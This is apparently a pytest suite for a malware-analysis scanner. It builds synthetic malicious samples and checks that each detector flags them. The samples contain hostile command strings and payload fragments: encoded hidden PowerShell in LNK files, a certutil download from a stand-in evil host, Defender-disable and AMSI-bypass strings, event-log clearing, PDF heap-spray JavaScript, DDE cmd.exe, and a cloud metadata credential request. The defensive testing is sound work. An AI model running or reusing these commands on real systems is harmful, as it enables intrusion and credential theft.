"""Tests for RTF analysis, binary runtime profiling, and IOC whitelisting."""

from __future__ import annotations

from hawkscan.core import fileinfo
from hawkscan.analyzers.base import AnalysisContext
from hawkscan.analyzers.rtf_analyzer import RTFAnalyzer
from hawkscan.analyzers.binprofile import BinProfileAnalyzer
from hawkscan.analyzers.strings_analyzer import _is_whitelisted


def _ctx(tmp_path, name, data, strings=None):
    f = tmp_path / name
    f.write_bytes(data)
    ctx = AnalysisContext(info=fileinfo.inspect(f), content=data)
    if strings is not None:
        ctx.cache["strings"] = strings
    return ctx


def test_rtf_detected_and_equation_exploit_flagged(tmp_path):
    rtf = (rb"{\rtf1\ansi{\object\objemb\objupdate"
           rb"{\*\objclass Equation.3}{\*\objdata 0105" + b"41" * 512 + rb"}}}")
    ctx = _ctx(tmp_path, "x.rtf", rtf)
    assert ctx.info.file_type == "rtf"
    titles = [f.title for f in RTFAnalyzer().analyze(ctx)]
    assert any("Equation Editor" in t for t in titles)
    assert any("objupdate" in t for t in titles)


def test_binprofile_detects_go(tmp_path):
    ctx = _ctx(tmp_path, "g.exe", b"MZ" + b"\x00" * 64,
               strings=["Go build ID: abc", "go1.21", "runtime.goexit"])
    labels = [f.data.get("runtime") for f in BinProfileAnalyzer().analyze(ctx)]
    assert "Go" in labels


def test_binprofile_recovers_go_buildinfo(tmp_path):
    from hawkscan.analyzers.binprofile import BinProfileAnalyzer
    data = (b"go1.21.3 runtime.goexit \xff Go buildinf:\x08\x00"
            b"path\tgithub.com/evil/loader\n"
            b"dep\tgithub.com/pkg/errors\tv0.9.1\th1:xyz\n")
    ctx = _ctx(tmp_path, "g.elf", data, strings=["go1.21.3", "runtime.goexit"])
    findings = list(BinProfileAnalyzer().analyze(ctx))
    bi = [f for f in findings if "Go build info" in f.title]
    assert bi and bi[0].data["go_module"] == "github.com/evil/loader"
    assert bi[0].data["go_version"] == "go1.21.3"


def test_binprofile_detects_dotnet(tmp_path):
    ctx = _ctx(tmp_path, "n.exe", b"MZ" + b"\x00" * 64,
               strings=["mscoree.dll", "_CorExeMain", "mscorlib"])
    labels = [f.data.get("runtime") for f in BinProfileAnalyzer().analyze(ctx)]
    assert ".NET / managed" in labels


def test_onenote_detected_with_embedded_object(tmp_path):
    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
    one = (b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d\xae\xb1\x53\x78\xd0\x29\x96\xd3"
           + b"\x00" * 32 + b"\xe7\x16\xe3\xbd\x65\x26\x11\x45" + b"MZ")
    ctx = _ctx(tmp_path, "n.one", one)
    assert ctx.info.file_type == "onenote"
    titles = [f.title for f in OfficeAnalyzer().analyze(ctx)]
    assert any("OneNote embedded file" in t for t in titles)


def test_macho_deep_indicators(tmp_path):
    from hawkscan.analyzers.macho_analyzer import MachOAnalyzer
    data = (b"\xcf\xfa\xed\xfe" + b"\x00" * 20
            + b" AuthorizationExecuteWithPrivileges login.keychain "
            + b".ssh/authorized_keys spctl --master-disable")
    ctx = _ctx(tmp_path, "m.macho", data)
    # Keep multi-word indicators intact (real extraction preserves spaces).
    ctx.cache["strings"] = [data.decode("latin1")]
    cats = {f.category for f in MachOAnalyzer().analyze(ctx)}
    assert "privilege" in cats and "credential-access" in cats and "evasion" in cats


def test_secrets_and_cloud_detection(tmp_path):
    from hawkscan.analyzers.secrets_analyzer import SecretsAnalyzer
    data = (b"export AWS_KEY=AKIAIOSFODNN7EXAMPLE\n"
            b"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/r\n"
            b"-----BEGIN RSA PRIVATE KEY-----\n")
    ctx = _ctx(tmp_path, "c.sh", data)
    titles = [f.title for f in SecretsAnalyzer().analyze(ctx)]
    assert any("AWS access key" in t for t in titles)
    assert any("IMDS" in t for t in titles)
    assert any("private key" in t.lower() for t in titles)


def test_ios_ipa_type_detection(tmp_path):
    import zipfile
    f = tmp_path / "app.ipa"
    with zipfile.ZipFile(f, "w") as zf:
        zf.writestr("Payload/App.app/Info.plist", b"<plist></plist>")
    assert fileinfo.inspect(f).file_type == "ios-app"


def test_lnk_command_detection(tmp_path):
    import struct
    from hawkscan.analyzers.lnk_analyzer import LnkAnalyzer
    hdr = bytearray(76)
    hdr[0:4] = (76).to_bytes(4, "little")
    hdr[4:20] = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
    struct.pack_into("<I", hdr, 20, 0x20)
    data = bytes(hdr) + b"powershell -w hidden -enc AAAA http://evil/x"
    ctx = _ctx(tmp_path, "x.lnk", data)
    assert ctx.info.file_type == "lnk"
    titles = [f.title for f in LnkAnalyzer().analyze(ctx)]
    assert any("command interpreter" in t for t in titles)


def test_vbe_encoder_detection(tmp_path):
    from hawkscan.analyzers.script_analyzer import ScriptAnalyzer
    ctx = _ctx(tmp_path, "x.vbe", b"#@~^ABCD==encoded==^#~@")
    titles = [f.title for f in ScriptAnalyzer().analyze(ctx)]
    assert any("Encoded script" in t for t in titles)


def test_pcap_beaconing_detection(tmp_path):
    import struct
    from hawkscan.analyzers.pcap_analyzer import PcapAnalyzer

    def rec(ts):
        eth = b"\xaa" * 6 + b"\xbb" * 6 + b"\x08\x00"
        ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 40, 1, 0, 64, 6, 0,
                         bytes([10, 0, 0, 5]), bytes([45, 77, 88, 99]))
        tcp = struct.pack(">HHIIBBHHH", 44000, 443, 0, 0, 0x50, 2, 0, 0, 0)
        pkt = eth + ip + tcp
        return struct.pack("<IIII", ts, 0, len(pkt), len(pkt)) + pkt

    gh = b"\xd4\xc3\xb2\xa1" + struct.pack("<HHIIII", 2, 4, 0, 0, 65535, 1)
    body = b"".join(rec(1000 + i * 10) for i in range(10))
    ctx = _ctx(tmp_path, "b.pcap", gh + body)
    titles = [f.title for f in PcapAnalyzer().analyze(ctx)]
    assert any("Beaconing" in t for t in titles)


def test_stego_appended_executable(tmp_path):
    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
    jpeg = b"\xff\xd8\xff\xe0" + b"\x00" * 200 + b"\xff\xd9"
    ctx = _ctx(tmp_path, "s.jpg", jpeg + b"MZ\x90\x00" + b"\x00" * 300)
    titles = [f.title for f in StegoAnalyzer().analyze(ctx)]
    assert any("appended after image" in t for t in titles)


def test_polyglot_detection(tmp_path):
    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 40 + b"IEND" + b"\x00" * 4
    ctx = _ctx(tmp_path, "p.png", png + b"PK\x03\x04 zip")
    titles = [f.title for f in StegoAnalyzer().analyze(ctx)]
    assert any("Polyglot" in t for t in titles)


def test_ole_analyzer_handles_non_ole_gracefully(tmp_path):
    from hawkscan.analyzers.ole_analyzer import OleAnalyzer
    # Applies only to OLE; a non-OLE file simply does not match.
    ctx = _ctx(tmp_path, "x.txt", b"not an ole file")
    assert OleAnalyzer().applies(ctx) is False


def test_ioc_whitelist():
    assert _is_whitelisted("http://schemas.microsoft.com/office")
    assert _is_whitelisted("http://www.w3.org/2000/svg")
    assert not _is_whitelisted("http://evil-c2-domain.tk/payload")


def test_pcap_extracts_dns_and_flags_suspicious_tld(tmp_path):
    import struct
    from hawkscan.analyzers.pcap_analyzer import PcapAnalyzer

    dns = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    for lbl in "evil-c2.ru".split("."):
        dns += bytes([len(lbl)]) + lbl.encode()
    dns += b"\x00" + struct.pack(">HH", 1, 1)
    udp = struct.pack(">HHHH", 5000, 53, 8 + len(dns), 0) + dns
    ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + len(udp), 1, 0, 64, 17, 0,
                     bytes([10, 0, 0, 5]), bytes([45, 77, 88, 99]))
    pkt = b"\xaa" * 6 + b"\xbb" * 6 + b"\x08\x00" + ip + udp
    gh = b"\xd4\xc3\xb2\xa1" + struct.pack("<HHIIII", 2, 4, 0, 0, 65535, 1)
    rec = struct.pack("<IIII", 0, 0, len(pkt), len(pkt)) + pkt

    ctx = _ctx(tmp_path, "t.pcap", gh + rec)
    assert ctx.info.file_type == "pcap"
    findings = list(PcapAnalyzer().analyze(ctx))
    titles = [f.title for f in findings]
    assert any("DNS quer" in t for t in titles)
    assert any("suspicious-TLD" in t for t in titles)


def test_email_phishing_indicators(tmp_path):
    import base64
    from hawkscan.analyzers.email_analyzer import EmailAnalyzer
    pe_b64 = base64.b64encode(b"MZ" + b"\x90" * 32).decode()
    eml = (
        'From: "Bank" <help@bank.com>\n'
        "Return-Path: <attacker@evil.ru>\n"
        "MIME-Version: 1.0\n"
        "Authentication-Results: mx; spf=fail; dmarc=fail\n"
        'Content-Type: multipart/mixed; boundary="B"\n\n'
        "--B\nContent-Type: text/plain\n\nopen it\n"
        "--B\nContent-Type: application/octet-stream; name=\"doc.pdf.exe\"\n"
        "Content-Transfer-Encoding: base64\n"
        'Content-Disposition: attachment; filename="doc.pdf.exe"\n\n'
        f"{pe_b64}\n--B--\n"
    ).encode()
    ctx = _ctx(tmp_path, "p.eml", eml)
    assert ctx.info.file_type == "email"
    titles = [f.title for f in EmailAnalyzer().analyze(ctx)]
    assert any("SPF" in t for t in titles)
    assert any("Double-extension" in t for t in titles)
    assert any("Return-Path" in t for t in titles)


def _system_pe():
    """Return a path to a real PE on this host, or None (e.g. on Linux CI)."""
    import glob
    import os
    for p in (r"C:\Windows\System32\where.exe",
              r"C:\Windows\System32\notepad.exe"):
        if os.path.exists(p):
            return p
    hits = glob.glob(r"C:\Windows\System32\*.exe")
    return hits[0] if hits else None


def test_pe_header_anomalies_on_mutated_binary(tmp_path):
    """Mutating a real PE (zero timestamp, rename a section, break the checksum)
    must light up the new header/section anomaly findings, while a clean PE stays
    quiet. Skips where pefile or a host PE is unavailable (Linux CI)."""
    import pytest
    pefile = pytest.importorskip("pefile")
    src = _system_pe()
    if not src:
        pytest.skip("no system PE available on this host")
    from hawkscan.core import fileinfo
    from hawkscan.analyzers.base import AnalysisContext
    from hawkscan.analyzers.pe_analyzer import PEAnalyzer

    pe = pefile.PE(src)
    pe.FILE_HEADER.TimeDateStamp = 0
    pe.OPTIONAL_HEADER.CheckSum = 0x11111111
    pe.sections[0].Name = b".packed\x00"
    out = tmp_path / "m.exe"
    pe.write(str(out))

    ctx = AnalysisContext(info=fileinfo.inspect(out), content=out.read_bytes())
    titles = [t.title for t in PEAnalyzer().analyze(ctx)]
    assert any("Zeroed compile timestamp" in t for t in titles)
    assert any("Non-standard section name" in t for t in titles)
    assert any("PE checksum invalid" in t for t in titles)

    # The unmodified original must not raise any of these anomalies.
    cln = AnalysisContext(info=fileinfo.inspect(src), content=open(src, "rb").read())
    clean_titles = [t.title for t in PEAnalyzer().analyze(cln)]
    assert not any("Zeroed compile timestamp" in t for t in clean_titles)
    assert not any("Future/forged compile timestamp" in t for t in clean_titles)


def _ooxml(tmp_path, name, parts):
    import zipfile
    f = tmp_path / name
    with zipfile.ZipFile(f, "w") as z:
        for n, c in parts.items():
            z.writestr(n, c)
    return f


def test_office_remote_template_injection(tmp_path):
    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
    rels = ('<Relationships xmlns="x"><Relationship Id="r1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            'relationships/attachedTemplate" Target="http://evil.tld/t.dotm" '
            'TargetMode="External"/></Relationships>')
    f = _ooxml(tmp_path, "a.docx", {"[Content_Types].xml": "<Types/>",
                                    "word/document.xml": "<w:document/>",
                                    "word/_rels/settings.xml.rels": rels})
    ctx = _ctx(tmp_path, "a.docx", f.read_bytes())
    titles = [t.title for t in OfficeAnalyzer().analyze(ctx)]
    assert any("Remote template injection" in t for t in titles)


def test_office_dde_and_xlm(tmp_path):
    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
    dde = _ooxml(tmp_path, "b.docx", {
        "[Content_Types].xml": "<Types/>",
        "word/document.xml": "<w:document><w:instrText>DDEAUTO cmd.exe"
                             "</w:instrText></w:document>"})
    titles = [t.title for t in OfficeAnalyzer().analyze(_ctx(tmp_path, "b.docx", dde.read_bytes()))]
    assert any("DDE" in t for t in titles)

    xlm = _ooxml(tmp_path, "c.xlsx", {"[Content_Types].xml": "<Types/>",
                                      "xl/macrosheets/sheet1.xml": "<x/>"})
    titles = [t.title for t in OfficeAnalyzer().analyze(_ctx(tmp_path, "c.xlsx", xlm.read_bytes()))]
    assert any("XLM" in t for t in titles)


def test_office_clean_hyperlink_no_fp(tmp_path):
    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
    rels = ('<Relationships xmlns="x"><Relationship Id="r1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            'relationships/hyperlink" Target="https://example.com" '
            'TargetMode="External"/></Relationships>')
    f = _ooxml(tmp_path, "d.docx", {"[Content_Types].xml": "<Types/>",
                                    "word/document.xml": "<w:document/>",
                                    "word/_rels/document.xml.rels": rels})
    titles = [t.title for t in OfficeAnalyzer().analyze(_ctx(tmp_path, "d.docx", f.read_bytes()))]
    assert not any("template injection" in t.lower() or "External" in t for t in titles)


def test_elf_structural_traits(tmp_path):
    import struct
    from hawkscan.analyzers.elf_analyzer import ELFAnalyzer
    # 64-bit ELF exec with one RWX PT_LOAD segment and no section headers.
    e_ident = b"\x7fELF" + bytes([2, 1, 1]) + b"\x00" * 9
    phoff, phentsize, phnum = 64, 56, 1
    hdr = e_ident + struct.pack("<HHI", 2, 0x3e, 1)
    hdr += struct.pack("<QQQ", 0, phoff, 0)            # entry, phoff, shoff=0
    hdr += struct.pack("<IHHHHHH", 0, 64, phentsize, phnum, 64, 0, 0)  # shnum=0
    ph = struct.pack("<II", 1, 0x7) + b"\x00" * 48      # PT_LOAD, RWX
    data = hdr + ph
    ctx = _ctx(tmp_path, "x.elf", data)
    if ctx.info.file_type != "elf":
        import pytest
        pytest.skip("synthetic ELF not recognised")
    ctx.cache["strings"] = []
    titles = [f.title for f in ELFAnalyzer().analyze(ctx)]
    assert any("RWX" in t for t in titles)
    assert any("Section headers absent" in t for t in titles)


def test_pdf_exploit_js_extraction_and_iocs(tmp_path):
    from hawkscan.analyzers.pdf_analyzer import PDFAnalyzer
    js = ("var x=util.printf('%45000f',1);var u='http://evil-pdf-c2.com/p.exe';"
          "var s=unescape('%u9090%u9090%u4141%u4242%u4343%u4444%u5050%u6060');")
    pdf = (b"%PDF-1.5\n1 0 obj<</OpenAction<</S/JavaScript/JS(" + js.encode()
           + b")>>>>endobj\n%%EOF")
    ctx = _ctx(tmp_path, "x.pdf", pdf)
    assert ctx.info.file_type == "pdf"
    fnds = list(PDFAnalyzer().analyze(ctx))
    titles = [f.title for f in fnds]
    assert any("Auto-executing JavaScript" in t for t in titles)
    assert any("util.printf" in t for t in titles)
    assert any("Heap-spray" in t for t in titles)
    iocs = [i for f in fnds for i in f.data.get("urls", [])]
    assert "http://evil-pdf-c2.com/p.exe" in iocs


def test_pdf_launch_target_extracted(tmp_path):
    import zlib
    from hawkscan.analyzers.pdf_analyzer import PDFAnalyzer
    pdf = (b"%PDF-1.7\n3 0 obj<</Type/Action/S/Launch/F(cmd.exe /c calc)>>endobj\n"
           b"%%EOF")
    ctx = _ctx(tmp_path, "y.pdf", pdf)
    titles = [f.title for f in PDFAnalyzer().analyze(ctx)]
    assert any("Launch action target: cmd.exe" in t for t in titles)


def test_macho_load_command_traits(tmp_path):
    import struct
    from hawkscan.analyzers.macho_analyzer import MachOAnalyzer
    # 64-bit LE Mach-O with an RWX segment, encrypted segment, and a /tmp dylib.
    def seg(name, initprot):
        body = name.encode().ljust(16, b"\x00") + struct.pack("<QQQQ", 0, 0x1000, 0, 0)
        body += struct.pack("<iiII", 7, initprot, 0, 0)
        return struct.pack("<II", 0x19, 8 + len(body)) + body

    def dylib(path):
        raw = struct.pack("<II", 0xC, 0) + struct.pack("<IIII", 24, 0, 0, 0) + path.encode() + b"\x00"
        raw = raw.ljust((len(raw) + 7) // 8 * 8, b"\x00")
        return raw[:4] + struct.pack("<I", len(raw)) + raw[8:]

    enc = struct.pack("<II", 0x2C, 20) + struct.pack("<III", 0, 0, 1)
    cmds = [seg("__TEXT", 7), enc, dylib("/tmp/evil.dylib")]
    hdr = struct.pack("<IiiIIIII", 0xfeedfacf, 0x01000007, 0, 2,
                      len(cmds), sum(len(c) for c in cmds), 0, 0)
    data = hdr + b"".join(cmds) + b"\x00" * 32
    ctx = _ctx(tmp_path, "x.macho", data)
    if ctx.info.file_type != "macho":
        import pytest
        pytest.skip("synthetic Mach-O not recognised")
    ctx.cache["strings"] = []
    titles = [f.title for f in MachOAnalyzer().analyze(ctx)]
    assert any("RWX" in t for t in titles)
    assert any("Encrypted Mach-O" in t for t in titles)
    assert any("suspicious path" in t for t in titles)


def test_email_phishing_body_analysis(tmp_path):
    from hawkscan.analyzers.email_analyzer import EmailAnalyzer
    eml = (b'From: "Support" <noreply@secure-x.com>\nTo: a@b.com\n'
           b'Subject: verify\nContent-Type: text/html\n\n'
           b'<html>Click <a href="http://10.0.0.9/login">www.paypal.com</a> '
           b'and <a href="http://bit.ly/z">here</a> or http://evil.tk/p</html>')
    ctx = _ctx(tmp_path, "p.eml", eml)
    assert ctx.info.file_type == "email"
    titles = [f.title for f in EmailAnalyzer().analyze(ctx)]
    assert any("text/target mismatch" in t for t in titles)
    assert any("IP-literal host" in t for t in titles)
    assert any("shortener" in t for t in titles)


def test_email_clean_no_phishing_fp(tmp_path):
    from hawkscan.analyzers.email_analyzer import EmailAnalyzer
    eml = (b'From: "Alice" <alice@example.com>\nTo: bob@example.com\n'
           b'Subject: lunch\nContent-Type: text/plain\n\n'
           b'See you at noon: https://example.com/menu')
    ctx = _ctx(tmp_path, "c.eml", eml)
    titles = [f.title for f in EmailAnalyzer().analyze(ctx)]
    assert not any(f_cat in t.lower() for t in titles
                   for f_cat in ("phishing", "spoofing", "mismatch"))


def test_pcap_tls_sni_extraction(tmp_path):
    import struct
    from hawkscan.analyzers.pcap_analyzer import PcapAnalyzer

    def client_hello(host):
        hb = host.encode()
        sni = (b"\x00\x00" + struct.pack(">H", len(hb) + 5)
               + struct.pack(">H", len(hb) + 3) + b"\x00"
               + struct.pack(">H", len(hb)) + hb)
        body = (b"\x03\x03" + b"\x00" * 32 + b"\x00" + b"\x00\x02\x00\x2f"
                + b"\x01\x00" + struct.pack(">H", len(sni)) + sni)
        hs = b"\x01" + struct.pack(">I", len(body))[1:] + body
        return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs

    payload = client_hello("evil-tls-c2.xyz")
    tcp = struct.pack(">HHIIBBHHH", 55000, 443, 0, 0, 0x50, 0x18, 0, 0, 0) + payload
    ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 1, 0, 64, 6, 0,
                     bytes([10, 0, 0, 5]), bytes([45, 77, 88, 99]))
    pkt = b"\xaa" * 6 + b"\xbb" * 6 + b"\x08\x00" + ip + tcp
    gh = b"\xd4\xc3\xb2\xa1" + struct.pack("<HHIIII", 2, 4, 0, 0, 65535, 1)
    data = gh + struct.pack("<IIII", 1000, 0, len(pkt), len(pkt)) + pkt
    ctx = _ctx(tmp_path, "t.pcap", data)
    fnds = list(PcapAnalyzer().analyze(ctx))
    assert any("TLS SNI" in f.title for f in fnds)
    assert any("evil-tls-c2.xyz" in f.data.get("sni", []) for f in fnds
               if f.data.get("sni"))


def test_lnk_structured_args_and_icon_spoof(tmp_path):
    import struct
    from hawkscan.analyzers.lnk_analyzer import LnkAnalyzer
    flags = 0x20 | 0x40 | 0x80  # args + icon + unicode
    hdr = bytearray(76)
    hdr[0:4] = (76).to_bytes(4, "little")
    hdr[4:20] = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
    struct.pack_into("<I", hdr, 20, flags)
    args = "-w hidden -nop -enc SQBFAFgA http://evil/x"
    icon = "C:\Windows\System32\AcroRd32.dll,0"
    data = bytes(hdr)
    data += struct.pack("<H", len(args)) + args.encode("utf-16le")
    data += struct.pack("<H", len(icon)) + icon.encode("utf-16le")
    ctx = _ctx(tmp_path, "x.lnk", data)
    assert ctx.info.file_type == "lnk"
    fnds = list(LnkAnalyzer().analyze(ctx))
    titles = [f.title for f in fnds]
    assert any("command interpreter" in t for t in titles)
    assert any("Icon spoofing" in t for t in titles)
    assert any(f.data.get("lnk_args", "").startswith("-w hidden") for f in fnds
               if f.data.get("lnk_args"))


def test_secrets_modern_tokens(tmp_path):
    from hawkscan.analyzers.secrets_analyzer import SecretsAnalyzer
    # Tokens are assembled at runtime from fragments so no contiguous secret
    # literal appears in source (avoids secret-scanning push protection); the
    # analyzer still sees the full token in the scanned bytes.
    stripe = "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc"
    gitlab = "glp" + "at-" + "ABCDEFGHIJ1234567890xy"
    anth = "sk-" + "ant-" + "api03-abcdefghijklmnopqrstuvwxyz"
    db = "postgres://admin:" + "s3cr3t" + "@db.internal:5432/app"
    data = f"STRIPE={stripe}\nGITLAB={gitlab}\nAN={anth}\nDB={db}\n".encode()
    ctx = _ctx(tmp_path, "s.env", data)
    titles = [f.title for f in SecretsAnalyzer().analyze(ctx)]
    assert "Stripe live secret key" in titles
    assert "GitLab personal access token" in titles
    assert "Database connection string with credentials" in titles
    assert "Anthropic API key" in titles


def test_secrets_no_fp_on_plain_config(tmp_path):
    from hawkscan.analyzers.secrets_analyzer import SecretsAnalyzer
    ctx = _ctx(tmp_path, "c.ini", b"name=app\nport=8080\nlog_level=info\ntimeout=30\n")
    assert list(SecretsAnalyzer().analyze(ctx)) == []


def test_binprofile_packer_detection(tmp_path):
    from hawkscan.analyzers.binprofile import BinProfileAnalyzer
    from hawkscan.analyzers.base import AnalysisContext
    from hawkscan.core import fileinfo
    f = tmp_path / "p.exe"
    f.write_bytes(b"MZ" + b"\x00" * 64)
    ctx = AnalysisContext(info=fileinfo.inspect(f), content=f.read_bytes())
    ctx.cache["strings"] = [".themida", "kernel32.dll", "WinLicense"]
    titles = [t.title for t in BinProfileAnalyzer().analyze(ctx)]
    assert any("Themida" in t for t in titles)
    # Clean MSVC strings -> no packer finding.
    ctx2 = AnalysisContext(info=fileinfo.inspect(f), content=f.read_bytes())
    ctx2.cache["strings"] = ["Microsoft Visual C++", "kernel32.dll", "user32.dll"]
    assert not any("Packed/protected" in t.title
                   for t in BinProfileAnalyzer().analyze(ctx2))


def test_stego_no_polyglot_fp_on_random_image_bytes(tmp_path):
    # A JPEG with random body bytes containing a chance 'MZ' must NOT be flagged
    # as a PE polyglot (the old 2-byte match false-positived on every image).
    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
    body = bytes((i * 73 + 0x4D) & 0xFF for i in range(4000))  # includes 'MZ' bytes
    jpeg = b"\xff\xd8\xff\xe0" + body + b"\xff\xd9"
    ctx = _ctx(tmp_path, "r.jpg", jpeg)
    titles = [f.title for f in StegoAnalyzer().analyze(ctx)]
    assert not any("PE executable" in t for t in titles)


def test_stego_detects_pe_dos_stub_polyglot(tmp_path):
    from hawkscan.analyzers.stego_analyzer import StegoAnalyzer
    jpeg = (b"\xff\xd8\xff\xe0" + b"\x00" * 100 + b"MZ\x90\x00"
            + b"This program cannot be run in DOS mode" + b"\x00" * 50 + b"\xff\xd9")
    ctx = _ctx(tmp_path, "x.jpg", jpeg)
    titles = [f.title for f in StegoAnalyzer().analyze(ctx)]
    assert any("PE executable" in t for t in titles)


def test_strings_behavior_and_ioc_additions(tmp_path):
    from hawkscan.analyzers.strings_analyzer import StringsAnalyzer
    data = (b"powershell Set-MpPreference -DisableRealtimeMonitoring $true\n"
            b"GetType('System.Management.Automation.AmsiUtils'); AmsiScanBuffer\n"
            b"certutil -urlcache -split -f http://evil/x.exe\n"
            b"wevtutil cl System\n"
            b"send to 0x32Be343B94f860124dC4fEe278FDCBD38C102D88\n"
            b"contact attacker@evil-mail.ru\n")
    ctx = _ctx(tmp_path, "s.bin", data)
    titles = [f.title for f in StringsAnalyzer().analyze(ctx)]
    assert any("Defender tampering" in t for t in titles)
    assert any("AMSI bypass" in t for t in titles)
    assert any("certutil" in t for t in titles)
    assert any("Event-log clearing" in t for t in titles)
    assert any("Ethereum address" in t for t in titles)
    assert any("email address" in t for t in titles)


def test_strings_clean_text_no_behavior_fp(tmp_path):
    from hawkscan.analyzers.strings_analyzer import StringsAnalyzer
    ctx = _ctx(tmp_path, "r.txt", b"The quick brown fox jumps over the lazy dog. " * 20)
    cats = {f.category for f in StringsAnalyzer().analyze(ctx)}
    assert "evasion" not in cats and "ransomware" not in cats
